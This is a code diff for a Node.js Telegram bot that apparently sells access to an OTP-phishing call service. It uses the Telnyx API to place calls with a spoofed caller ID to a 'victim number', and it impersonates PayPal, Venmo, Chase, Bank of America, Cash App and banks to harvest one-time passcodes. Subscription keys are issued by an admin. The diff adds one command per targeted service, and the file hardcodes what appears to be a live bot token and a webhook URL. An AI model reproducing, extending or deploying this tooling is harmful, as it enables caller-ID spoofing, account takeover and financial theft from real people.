@@ -4,9 +4,8 @@ const service_number = '+14342338629'
 const WEBHOOK_URL = 'https://ofbtc.onrender.com';
 const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
 
-const voice_app_id = '2305446111344592690'
-const outbound_profile_ID = '2304207034620315295'
 const connection_id = '2307488084473677329' //did not work
+const app_id = '2307620830302962752'
 
 const telnyx = require('telnyx')(MY_API_KEY);
 const { Telegraf } = require('telegraf'); // importing telegraf.js
@@ -15,6 +14,8 @@ var bot = new Telegraf(bot_token)
 const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
+const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
+
 
 var sqlite3 = require('sqlite3');
 var db = new sqlite3.Database('db.sqlite3');
@@ -31,7 +32,7 @@ db.run( table, [], function(err) {
    } else {
      console.log('Table created successfully');
    }
-} );
+});
 
 
 // Define a function to insert a new entry into the table
@@ -120,7 +121,7 @@ async function call (spoof, customer_number, ctx, service, name, digit){
       console.log('your connections are: ', connection)
 
       const { data: call } = await telnyx.calls.create({
-         connection_id: connection.id,
+         // connection_id: '2307488084473677329',
          to: `+${customer_number}`,
          from: service_number,
          from_display_name: `+${spoof}`,
@@ -151,6 +152,7 @@ async function call (spoof, customer_number, ctx, service, name, digit){
 
 }
 
+// BOT INITIALIZATION
 bot.on('start', ctx => {
    console.log(ctx.from)
    bot.telegram.sendMessage(
@@ -195,8 +197,14 @@ bot.command('new_key', adminFilter, ctx => {
    insertEntry( newKey, '', duration, ctx)
 })
 
+
 //  USER COMMANDS
 bot.command('auth_key', ctx => {
+   const [auth, key] = ctx.message.text.split(' ');
+   updateEntry(key, ctx.from.id, ctx)
+})
+
+bot.command('redeem', ctx => {
    const [auth, key] = ctx.message.text.split(' ');
    updateEntry(key, ctx.from.id, ctx)
 })
@@ -207,8 +215,10 @@ bot.command('checktime', ctx => {
    bot.telegram.sendMessage(ctx.chat.id, `you have left ${duration} left`)
 })
 
+
+// USER RESTRICTED COMMANDS
 bot.command('call', userFilter, ctx => {
-   const [command, spoof, number, service, digit ]= ctx.message.text.split(' ');
+   const [command, spoof, number, service, name, digit ]= ctx.message.text.split(' ');
    const serviceList = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
 
    if( !number || !serviceList.includes(service) ){
@@ -224,12 +234,143 @@ bot.command('call', userFilter, ctx => {
 ✅ OTP DIGIT - ${digit} 
          `, {})
 
-      call(spoof, number, ctx, service, 6)
+      call(spoof, number, ctx, service, name, 6)
    }
 
 
 })
 
+bot.command('paypal', userFilter, ctx => {
+   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');
+
+   if( !number || !serviceList.includes(command) ){
+      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
+   }
+   else{
+      bot.telegram.sendMessage(ctx.chat.id, 
+         `
+✅ CALL STARTING\n 
+✅ SPOOF NUBER - ${spoof}\n 
+✅ VICTIM NUBER - ${number}\n 
+✅ SERIVCE - ${command}\n
+✅ OTP DIGIT - ${digit} 
+         `, {})
+
+      call(spoof, number, ctx, command, name, 6)
+   }
+
+
+})
+
+bot.command('venmo', userFilter, ctx => {
+   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');
+
+   if( !number || !serviceList.includes(command) ){
+      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
+   }
+   else{
+      bot.telegram.sendMessage(ctx.chat.id, 
+         `
+✅ CALL STARTING\n 
+✅ SPOOF NUBER - ${spoof}\n 
+✅ VICTIM NUBER - ${number}\n 
+✅ SERIVCE - ${command}\n
+✅ OTP DIGIT - ${digit} 
+         `, {})
+
+      call(spoof, number, ctx, command, name, 6)
+   }
+
+
+})
+
+bot.command('boa', userFilter, ctx => {
+   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');
+
+   if( !number || !serviceList.includes(command) ){
+      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
+   }
+   else{
+      bot.telegram.sendMessage(ctx.chat.id, 
+         `
+✅ CALL STARTING\n 
+✅ SPOOF NUBER - ${spoof}\n 
+✅ VICTIM NUBER - ${number}\n 
+✅ SERIVCE - ${command}\n
+✅ OTP DIGIT - ${digit} 
+         `, {})
+
+      call(spoof, number, ctx, command, name, 6)
+   }
+
+
+})
+
+bot.command('chase', userFilter, ctx => {
+   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');
+
+   if( !number || !serviceList.includes(command) ){
+      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
+   }
+   else{
+      bot.telegram.sendMessage(ctx.chat.id, 
+         `
+✅ CALL STARTING\n 
+✅ SPOOF NUBER - ${spoof}\n 
+✅ VICTIM NUBER - ${number}\n 
+✅ SERIVCE - ${command}\n
+✅ OTP DIGIT - ${digit} 
+         `, {})
+
+      call(spoof, number, ctx, command, name, 6)
+   }
+
+
+})
+
+bot.command('cashapp', userFilter, ctx => {
+   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');
+
+   if( !number || !serviceList.includes(command) ){
+      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
+   }
+   else{
+      bot.telegram.sendMessage(ctx.chat.id, 
+         `
+✅ CALL STARTING\n 
+✅ SPOOF NUBER - ${spoof}\n 
+✅ VICTIM NUBER - ${number}\n 
+✅ SERIVCE - ${command}\n
+✅ OTP DIGIT - ${digit} 
+         `, {})
+
+      call(spoof, number, ctx, command, name, 6)
+   }
+
+
+})
+
+bot.command('bank', userFilter, ctx => {
+   const [command, spoof, number, name, digit ]= ctx.message.text.split(' ');
+
+   if( !number || !serviceList.includes(command) ){
+      bot.telegram.sendMessage(ctx.chat.id, `❌ Error  : Invalid number or service not available`, {}).then(() => {})
+   }
+   else{
+      bot.telegram.sendMessage(ctx.chat.id, 
+         `
+✅ CALL STARTING\n 
+✅ SPOOF NUBER - ${spoof}\n 
+✅ VICTIM NUBER - ${number}\n 
+✅ SERIVCE - ${command}\n
+✅ OTP DIGIT - ${digit} 
+         `, {})
+
+      call(spoof, number, ctx, command, name, 6)
+   }
+
+
+})
 
 bot.launch();
 
